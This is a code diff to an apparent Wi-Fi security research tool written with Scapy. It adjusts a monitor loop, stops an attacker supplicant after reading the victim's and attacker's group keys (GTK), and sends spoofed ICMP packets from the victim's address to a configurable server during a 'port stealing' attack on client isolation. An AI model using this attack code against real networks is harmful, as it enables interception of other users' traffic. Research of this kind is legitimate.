@@ -221,13 +221,13 @@ class Monitor(Daemon):
 		while not condition() and curr_time < end_time:
 			sockets = [self.sock_mon]
 
-			remaining_time = min(end_time - curr_time, 0.00001)
+			remaining_time = min(end_time - curr_time, 0.5)
 			sel = select.select(sockets, [], [], remaining_time)
 			if self.sock_mon in sel[0]:
 				p = self.sock_mon.recv()
 				if p != None: self.handle_mon(p)
 
-			#self.time_tick()
+			self.time_tick()
 			curr_time = time.time()
 	def is_target_frame(self, p):
 		if not p.haslayer(Dot11) or not p.haslayer(Dot11CCMP):
@@ -906,7 +906,7 @@ class Client2Client:
 		#log(STATUS, f">>> Frame detected: {eth.summary()}", color="green")
 
 		if (ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890") or (UDP in eth and eth[UDP].sport == self.options.iperf_port) :
-			log(STATUS, f">>> Downlink port stealing is successful. Frame seq: {(bytes(eth[UDP].payload)[8:12]).hex()}", color="red")
+			log(STATUS, f">>> Downlink port stealing is successful.", color="red")
 			
 			if self.options.reinject_reflection:
 				self.reinject_frame_via_broadcast_reflection(eth)
@@ -1025,6 +1025,7 @@ class Client2Client:
 			attacker_gtk_2 = self.sup_attacker.get_gtk_2()
 			log(STATUS, f">>> The victim's GTK is ({victim_gtk_2}).", color="green")
 			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk_2}).", color="green")
+			self.sup_attacker.stop()
 			self.mon_attacker = Monitor(self.options.c2c_gtk_inject, self.options)
 			self.mon_attacker.start()
 
@@ -1076,7 +1077,7 @@ class Client2Client:
 
 		if not self.options.measure:
 			for _ in range(500000):
-				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
+				ip = IP(src=self.sup_victim.clientip, dst=self.options.server)/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
 				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
 				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
 				self.sup_victim.send_eth(p)
@@ -1488,7 +1489,6 @@ def main():
 
 if __name__ == "__main__":
 	main()
-
 
 
 
